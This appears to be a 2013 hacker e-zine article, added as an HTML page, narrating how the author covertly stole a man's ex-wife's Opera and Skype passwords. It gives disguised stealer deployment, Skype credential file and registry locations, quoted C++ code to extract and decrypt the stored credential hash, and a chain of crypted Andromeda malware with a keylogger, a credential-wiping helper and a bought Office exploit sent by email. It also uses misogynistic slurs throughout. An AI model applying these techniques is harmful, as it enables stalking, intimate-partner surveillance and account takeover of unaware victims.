@@ -1,0 +1,250 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+	<head>
+		<META http-equiv="Content-Type" content="text/html; charset=windows-1251">
+		<link rel="stylesheet" type="text/css" href="style/style.css">
+		<title> History of hacking </title>
+	</head>
+
+	<body>
+	<table cellpadding="25" align="center" >
+			<tr>
+				<td>
+					<h2><span class="header">History of hacking</span></h2>
+					<p class="text"><br>
+					- I should write an article...<br>
+					- Well, how about "Once upon a time…"<br>
+					- Naw, it has to be about hackers. <br>
+					- Well, how about "Once upon a time there was a hacker…"</p> 
+					<p class="text">Let's do this!<br>
+					Today we will talk about <span class="warning">hacks.</span><br> 
+					Perhaps I should tell you one of my unforgettable stories. One of my friends came to me with a request. He hesitated, didn't know how to start, but eventually told me everything.
+So, a middle-aged man found a young bride. He was happy and satisfied, thinking that only death would part them. However, at some point the sweet wife turned into a real bitch, wheels and all that. 
+Instead of the kids and life of joy promised, the wife got her stuff and moved in with her mom, right after filing for divorce and taking the husband to the cleaners.  </p>
+					<p class="text">He had a heart attack...
+He came to visit me soon after that. He said that something was wrong and there had to be an explanation. Let's see why she is always hanging out on the odnoklassniki.ru. 
+OMFG! Odnoklassniki again... Fucking social perverts! Oh well. He did need help! We had to get ready then. </p>
+					<p class="text">I explained all the options to him. What options did we have? In theory, we could try  launch a keylogger or a stealer, but under what pretense?
+On the other hand, we could retrieve her password to the e-mail, getting access to the latter using the "Secret Question". The dude was fond of his ex-wife and knew her pretty well.
+All these methods had one major drawback. The bitch was not supposed to find out she's been fucked over, so it had to be a covert operation. 
+Thus, the password retrieval was not really an option. The only option left was trying to get hold of the pass using a stealer. The ex-beloved had been using  Opera all her life...</p>
+
+					<p class="text">A build of the classic <span class="warning">UFR Stealer</span> was prepared and crypted. The dude got the build on a flash drive. The build was put in a separate folder, while the shortcut was in the folder with photos. 
+Obviously, the shortcut had a jpg. icon from the system library and had a name !ima3684. The exclamation mark was there to make sure the file would be the first on the list. 
+The plan was for the dude to visit his ex and give her some kind of family photos (what do you know, the bitch was sentimental)
+They say we make our own luck:  my fiend suddenly remembered that she had gone online from his laptop when he had been away. 
+Yay! We launched the stealer on the laptop and there it was! The password was saved, duh! Either the dude had a serious case of amnesia or it never occurred to him somehow. 
+I left him alone with her messages and went home...</p>
+					
+					<p class="text">After three or four days I got a call! Another heart attack... He called me from the hospital. Unbefuckinglievable! Their marriage was a set-up from the get-go, suggested by her fuckbuddy, so he had an impressive set of horns too. 
+I felt sorry for him and asked if I could help with anything.
+He said that had he knew everything, but their conversation was mostly via Skype, so he needed the logs! 
+Skype it was!</p>
+					<p class="text">I used Google to get some information, but things did not look good. Skype it is not ICQ or Opera. Turns out, it's pretty fucked up when it comes to gaining access to someone's data. 
+The thing is, when the password is stored, it's neither unencrypted nor hashed. The password gets mixed with the system ID in some magic way (HDD most liekly) and then gets its own hash that's later stored in the system.<br>
+Here is some reading on it <a href="http://www.skypetips.ru/skype_profile.htm" target="_blank">http://www.skypetips.ru/skype_profile.htm</a><br>
+Checking… Bingo! All the data we need is in the file - <span class="warning">"c:\Documents and Settings\user_name\Application Data\Skype\shared.xml"</span>,  
+while the hash is stored here - <span class="warning">"c:\Documents and Settings\user_name\Application Data\Skype\login_skype\config.xml".</span><br>
+But someone made a mistake. I discovered it watching this video -  <br>
+<a href="http://www.youtube.com/watch?v=5Z-0x75f1ec" target="_blank">http://www.youtube.com/watch?v=5Z-0x75f1ec</a></p>
+
+
+					<p class="warning">
+					&#8249;Credentials3&#8250;8AA7F687754705A7080A9FA13184D8D5A.........&#8249;/Credentials3&#8250;</p> 
+
+
+					<p class="text">This is the line we need. <br>
+					Initially, this article got my attention: <br>
+					<a href="http://habrahabr.ru/qa/20561/" target="_blank">http://habrahabr.ru/qa/20561/</a><br><br>
+					<span class="warning">[quote]<br>
+					I know that hash needs to be built this way:</span></p>
+					
+					
+					
+<pre class="c" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> MD5_Skype_Password <span style="color: #009900;">&#40;</span><span style="color: #993333;">const</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>username<span style="color: #339933;">,</span> <span style="color: #993333;">const</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>password<span style="color: #339933;">,</span> <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>hash128<span style="color: #009900;">&#41;</span>
+<span style="color: #009900;">&#123;</span>
+MD5_state skyper <span style="color: #339933;">=</span> MD5_INIT<span style="color: #339933;">;</span>
+&nbsp;
+MD5_update <span style="color: #009900;">&#40;</span><span style="color: #339933;">&amp;</span>skyper<span style="color: #339933;">,</span> username<span style="color: #339933;">,</span> <span style="color: #009900;">&#40;</span>u32<span style="color: #009900;">&#41;</span> strlen <span style="color: #009900;">&#40;</span>username<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+MD5_update <span style="color: #009900;">&#40;</span><span style="color: #339933;">&amp;</span>skyper<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;nskypern&quot;</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">8</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+MD5_update <span style="color: #009900;">&#40;</span><span style="color: #339933;">&amp;</span>skyper<span style="color: #339933;">,</span> password<span style="color: #339933;">,</span> <span style="color: #009900;">&#40;</span>u32<span style="color: #009900;">&#41;</span> strlen <span style="color: #009900;">&#40;</span>password<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+MD5_end <span style="color: #009900;">&#40;</span><span style="color: #339933;">&amp;</span>skyper<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+memcpy <span style="color: #009900;">&#40;</span>hash128<span style="color: #339933;">,</span> skyper.<span style="color: #202020;">hash</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">16</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #b1b100;">return</span> <span style="color: #0000dd;">16</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span></pre>
+
+
+
+					<p class="text"><br>
+					<span class="warning">[/quote]</span></p>
+					
+					<p class="text">But something was not right. I continued googling and found the following:</p>
+					<ul>
+					<li><a href="https://new-crew.net/showthread.php?tid=1328" target="_blank">https://new-crew.net/showthread.php?tid=1328</a></li>
+					<li><a href="http://insecurety.net/?p=427" target="_blank">http://insecurety.net/?p=427</a></li>
+					</ul>
+					
+					<p class="text"><br>
+					<span class="warning">[quote]<br>
+					To extract the Credentials ciphertext, you could read the contents of config.xml and scan for &#8249;Credentials3&#8250; and &#8249;/Credentials3&#8250;
+Here, I’m using LibXML </span></p>
+
+
+
+<pre class="cpp" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #0000ff;">bool</span> GetCredentials<span style="color: #008000;">&#40;</span>BYTE ciphertext<span style="color: #008000;">&#91;</span><span style="color: #008000;">&#93;</span>, std<span style="color: #008080;">::</span><span style="color: #007788;">string</span> config_xml<span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>    
+    <span style="color: #0000ff;">bool</span> bFound <span style="color: #000080;">=</span> <span style="color: #0000ff;">false</span><span style="color: #008080;">;</span>
+&nbsp;
+    <span style="color: #666666;">// try open config.xml</span>
+    xmlTextReaderPtr reader<span style="color: #008080;">;</span>
+    reader <span style="color: #000080;">=</span> xmlReaderForFile<span style="color: #008000;">&#40;</span>config_xml.<span style="color: #007788;">c_str</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span>, <span style="color: #0000ff;">NULL</span>, <span style="color: #0000dd;">0</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+&nbsp;
+    <span style="color: #666666;">// tested with Credentials2 or Credentials3</span>
+    <span style="color: #0000ff;">const</span> xmlChar <span style="color: #000040;">*</span>credentials<span style="color: #008080;">;</span> 
+    credentials <span style="color: #000080;">=</span> <span style="color: #008000;">&#40;</span><span style="color: #0000ff;">const</span> xmlChar<span style="color: #000040;">*</span><span style="color: #008000;">&#41;</span><span style="color: #FF0000;">&quot;Credentials&quot;</span><span style="color: #008080;">;</span>
+&nbsp;
+    <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>reader <span style="color: #000040;">!</span><span style="color: #000080;">=</span> <span style="color: #0000ff;">NULL</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
+&nbsp;
+      <span style="color: #666666;">// while nodes are available</span>
+      <span style="color: #0000ff;">while</span> <span style="color: #008000;">&#40;</span>xmlTextReaderRead<span style="color: #008000;">&#40;</span>reader<span style="color: #008000;">&#41;</span> <span style="color: #000080;">==</span> <span style="color: #0000dd;">1</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
+        <span style="color: #666666;">// get name</span>
+        <span style="color: #0000ff;">const</span> xmlChar <span style="color: #000040;">*</span>name<span style="color: #008080;">;</span>
+        name <span style="color: #000080;">=</span> xmlTextReaderConstName<span style="color: #008000;">&#40;</span>reader<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+        <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>name <span style="color: #000080;">==</span> <span style="color: #0000ff;">NULL</span><span style="color: #008000;">&#41;</span> <span style="color: #0000ff;">continue</span><span style="color: #008080;">;</span>
+&nbsp;
+        <span style="color: #666666;">// equal to credentials we're searching for?</span>
+        <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>xmlStrncmp<span style="color: #008000;">&#40;</span>credentials, name, xmlStrlen<span style="color: #008000;">&#40;</span>credentials<span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span> <span style="color: #000080;">==</span> <span style="color: #0000dd;">0</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
+&nbsp;
+          <span style="color: #666666;">// read the next value</span>
+          <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>xmlTextReaderRead<span style="color: #008000;">&#40;</span>reader<span style="color: #008000;">&#41;</span> <span style="color: #000080;">==</span> <span style="color: #0000dd;">1</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
+            <span style="color: #0000ff;">const</span> xmlChar <span style="color: #000040;">*</span>value<span style="color: #008080;">;</span>
+            value <span style="color: #000080;">=</span> xmlTextReaderConstValue<span style="color: #008000;">&#40;</span>reader<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+&nbsp;
+            <span style="color: #0000ff;">for</span> <span style="color: #008000;">&#40;</span><span style="color: #0000ff;">int</span> i <span style="color: #000080;">=</span> <span style="color: #0000dd;">0</span><span style="color: #008080;">;</span>i <span style="color: #000080;">&lt;</span> <span style="color: #0000dd;">16</span><span style="color: #008080;">;</span>i<span style="color: #000040;">++</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
+              <span style="color: #0000dd;">sscanf</span><span style="color: #008000;">&#40;</span><span style="color: #008000;">&#40;</span><span style="color: #0000ff;">const</span> <span style="color: #0000ff;">char</span><span style="color: #000040;">*</span><span style="color: #008000;">&#41;</span><span style="color: #000040;">&amp;</span>value, <span style="color: #FF0000;">&quot;%02x&quot;</span>, <span style="color: #000040;">&amp;</span>ciphertext<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+            <span style="color: #008000;">&#125;</span>
+            bFound <span style="color: #000080;">=</span> <span style="color: #0000ff;">true</span><span style="color: #008080;">;</span>
+            <span style="color: #0000ff;">break</span><span style="color: #008080;">;</span>
+          <span style="color: #008000;">&#125;</span>
+        <span style="color: #008000;">&#125;</span>
+      <span style="color: #008000;">&#125;</span>
+      xmlFreeTextReader<span style="color: #008000;">&#40;</span>reader<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+    <span style="color: #008000;">&#125;</span>
+    xmlCleanupParser<span style="color: #008000;">&#40;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+    <span style="color: #0000ff;">return</span> bFound<span style="color: #008080;">;</span>
+<span style="color: #008000;">&#125;</span></pre>
+
+
+
+					<p class="warning"><br>
+					Obtain the salt which is passed to SHA-1 before being used to create AES key.</p>
+					
+					
+					
+<pre class="cpp" style="font-family:monospace; font-size: 80%; background: #e8e8e8;">PBYTE GetSalt<span style="color: #008000;">&#40;</span>DWORD <span style="color: #000040;">&amp;</span>cbSalt<span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
+    BYTE aBlob<span style="color: #008000;">&#91;</span><span style="color: #0000dd;">2048</span><span style="color: #008000;">&#93;</span><span style="color: #008080;">;</span>
+    DWORD cbSize <span style="color: #000080;">=</span> <span style="color: #0000dd;">sizeof</span><span style="color: #008000;">&#40;</span>aBlob<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+    <span style="color: #0000ff;">const</span> <span style="color: #0000ff;">char</span> skype_path<span style="color: #008000;">&#91;</span><span style="color: #008000;">&#93;</span> <span style="color: #000080;">=</span> <span style="color: #FF0000;">&quot;Software\Skype\ProtectedStorage&quot;</span><span style="color: #008080;">;</span>
+&nbsp;
+    LSTATUS lStatus <span style="color: #000080;">=</span> SHGetValue<span style="color: #008000;">&#40;</span>HKEY_CURRENT_USER, skype_path, 
+        <span style="color: #FF0000;">&quot;0&quot;</span>, <span style="color: #0000dd;">0</span>, aBlob, <span style="color: #000040;">&amp;</span>cbSize<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+&nbsp;
+    <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>lStatus <span style="color: #000040;">!</span><span style="color: #000080;">=</span> ERROR_SUCCESS<span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
+      <span style="color: #0000dd;">printf</span><span style="color: #008000;">&#40;</span><span style="color: #FF0000;">&quot;  Unable to open skype key : %08x&quot;</span>, lStatus<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+      <span style="color: #0000ff;">return</span> <span style="color: #0000ff;">NULL</span><span style="color: #008080;">;</span>
+    <span style="color: #008000;">&#125;</span>
+&nbsp;
+    DATA_BLOB in, out<span style="color: #008080;">;</span>
+&nbsp;
+    in.<span style="color: #007788;">pbData</span> <span style="color: #000080;">=</span> aBlob<span style="color: #008080;">;</span>
+    in.<span style="color: #007788;">cbData</span> <span style="color: #000080;">=</span> cbSize<span style="color: #008080;">;</span>
+&nbsp;
+    <span style="color: #0000ff;">if</span> <span style="color: #008000;">&#40;</span>CryptUnprotectData<span style="color: #008000;">&#40;</span><span style="color: #000040;">&amp;</span>in, <span style="color: #0000ff;">NULL</span>, <span style="color: #0000ff;">NULL</span>, <span style="color: #0000ff;">NULL</span>, 
+        <span style="color: #0000ff;">NULL</span>, <span style="color: #0000dd;">0</span>, <span style="color: #000040;">&amp;</span>out<span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
+      cbSalt <span style="color: #000080;">=</span> out.<span style="color: #007788;">cbData</span><span style="color: #008080;">;</span>
+      <span style="color: #0000ff;">return</span> out.<span style="color: #007788;">pbData</span><span style="color: #008080;">;</span>
+    <span style="color: #008000;">&#125;</span> <span style="color: #0000ff;">else</span> <span style="color: #008000;">&#123;</span>
+      <span style="color: #0000dd;">printf</span><span style="color: #008000;">&#40;</span><span style="color: #FF0000;">&quot;  Unable to decrypt skype entry.&quot;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+    <span style="color: #008000;">&#125;</span>
+    <span style="color: #0000ff;">return</span> <span style="color: #0000ff;">NULL</span><span style="color: #008080;">;</span>
+<span style="color: #008000;">&#125;</span></pre>
+
+
+
+					<p class="warning"><br>
+					Then with both the ciphertext and salt, we can decrypt MD5 hash…</p>
+					
+					
+					
+<pre class="cpp" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #0000ff;">void</span> DecryptHash<span style="color: #008000;">&#40;</span>PBYTE pbCipherText, PBYTE pbSalt, DWORD cbSalt<span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
+&nbsp;
+    SHA_CTX ctx<span style="color: #008080;">;</span>
+    AES_KEY key<span style="color: #008080;">;</span>
+&nbsp;
+    u_int8_t dgst<span style="color: #008000;">&#91;</span><span style="color: #0000dd;">40</span><span style="color: #008000;">&#93;</span>, buffer<span style="color: #008000;">&#91;</span>AES_BLOCK_SIZE<span style="color: #008000;">&#93;</span><span style="color: #008080;">;</span>
+&nbsp;
+    <span style="color: #0000dd;">memset</span><span style="color: #008000;">&#40;</span><span style="color: #000040;">&amp;</span>buffer, <span style="color: #0000dd;">0</span>, <span style="color: #0000dd;">sizeof</span><span style="color: #008000;">&#40;</span>buffer<span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+&nbsp;
+    <span style="color: #666666;">// use counter mode + SHA-1 to generate key</span>
+    <span style="color: #0000ff;">for</span> <span style="color: #008000;">&#40;</span>ULONG i <span style="color: #000080;">=</span> <span style="color: #0000dd;">0</span><span style="color: #008080;">;</span>i <span style="color: #000080;">&lt;</span> <span style="color: #0000dd;">2</span><span style="color: #008080;">;</span>i<span style="color: #000040;">++</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
+      ULONG ulIndex <span style="color: #000080;">=</span> _byteswap_ulong<span style="color: #008000;">&#40;</span>i<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+&nbsp;
+      SHA1_Init<span style="color: #008000;">&#40;</span><span style="color: #000040;">&amp;</span>ctx<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+      SHA1_Update<span style="color: #008000;">&#40;</span><span style="color: #000040;">&amp;</span>ctx, <span style="color: #000040;">&amp;</span>ulIndex, <span style="color: #0000dd;">sizeof</span><span style="color: #008000;">&#40;</span>ulIndex<span style="color: #008000;">&#41;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+      SHA1_Update<span style="color: #008000;">&#40;</span><span style="color: #000040;">&amp;</span>ctx, pbSalt, cbSalt<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+      SHA1_Final<span style="color: #008000;">&#40;</span><span style="color: #000040;">&amp;</span>dgst<span style="color: #008000;">&#91;</span>i<span style="color: #000040;">*</span><span style="color: #0000dd;">20</span><span style="color: #008000;">&#93;</span>, <span style="color: #000040;">&amp;</span>ctx<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+    <span style="color: #008000;">&#125;</span>
+&nbsp;
+    AES_set_encrypt_key<span style="color: #008000;">&#40;</span>dgst, <span style="color: #0000dd;">256</span>, <span style="color: #000040;">&amp;</span>key<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+    AES_encrypt<span style="color: #008000;">&#40;</span>buffer, buffer, <span style="color: #000040;">&amp;</span>key<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+&nbsp;
+    <span style="color: #0000dd;">printf</span><span style="color: #008000;">&#40;</span><span style="color: #FF0000;">&quot;n  MD5 hash = &quot;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+&nbsp;
+    <span style="color: #666666;">// decrypt MD5 hash with XOR</span>
+    <span style="color: #0000ff;">for</span> <span style="color: #008000;">&#40;</span><span style="color: #0000ff;">int</span> i <span style="color: #000080;">=</span> <span style="color: #0000dd;">0</span><span style="color: #008080;">;</span>i <span style="color: #000080;">&lt;</span> <span style="color: #0000dd;">16</span><span style="color: #008080;">;</span>i<span style="color: #000040;">++</span><span style="color: #008000;">&#41;</span> <span style="color: #008000;">&#123;</span>
+      <span style="color: #0000dd;">printf</span><span style="color: #008000;">&#40;</span><span style="color: #FF0000;">&quot;%02x&quot;</span>, pbCipherText <span style="color: #000040;">^</span> buffer<span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+    <span style="color: #008000;">&#125;</span>
+    <span style="color: #0000dd;">printf</span><span style="color: #008000;">&#40;</span><span style="color: #FF0000;">&quot;n&quot;</span><span style="color: #008000;">&#41;</span><span style="color: #008080;">;</span>
+<span style="color: #008000;">&#125;</span></pre>
+
+
+
+					<p class="warning"><br>
+					[/quote]</p>
+					
+					<p class="text">I made an attempt to decrypt my own password. I opened the configuration and got a line from it... I tried this way and that way but never got the initial combination. I changed places, changed the variants of combinations, but it was all for nothing. Either I was not so gifted after all or the algorithm had changed since then. 
+Continuous Google search was unsuccessful. The line would not be decrypted. (I would like to discuss the links and materials above. My coder skills may not have been enough or I missed something. In the end, I would like to get software that will be able to make password recoveries. Back then, I had no time to waste and had to move on).
+What else could I do…</p>
+					<p class="text">And suddenly I had it! We take an andromeda, crypt it, add keylogger plug. In the keylogger, set the skype.exe process 
+Separately from all that we make a tiny binary code file that recursively searches for any config.xml files in Documents and Settings. If any line starts with <span class="warning">&#8249;Credentials</span> the data is deleted.
+We crypt and name it as a task in andromeda. Then, for an undisclosed amount of money,  glue our andromeda with the doc file. The seller guaranteed it would work on a limited number of  Office versions...
+We send it by e-mail and wait... Bingo!</p>
+
+					<p class="text">Let me explain what just happened.</p>
+					<ul>
+					<li>Changing or deleting the value of the <span class="warning">&#8249;Credentials3&#8250;</span> line doesn't cause an error but makes the user re-enter the password. It happens a lot with Skype, so no one really thinks twice when they need to are-enter password. </li>
+					<li>The entered password is caught by keylogger and sent to us.</li>
+					<li>Skype saves all history on the server, so we can read whatever we please without any problems.</li>
+					<li>The password was never changed and our victim never knew what hit her!</li>
+					</ul>
+					
+					<p class="text">I sent the password to my friend and demanded my bottle of cognac. I left him there deep in his thoughts. </p>
+					
+					<p class="text">We are fortunate to have known the attack vectors and had all appropriate tools. Guys, never get married...</p> 
+					<p class="text"><br>
+					Every gorgeous babe <br>
+					And every cute girlfriend<br>
+					When given time and chance<br>
+					May show her true colors<br><br>
+					<span class="warning">p.s. </span> Cognac is still waiting ...
+					</p>
+
+<p class="warning"><br>______________________________<br>
+Ar3s<br> 
+2013<br><br>
+Inception E-Zine</p>
+
+				</td>
+			</tr>
+		</table>
+	</body>
+</html>
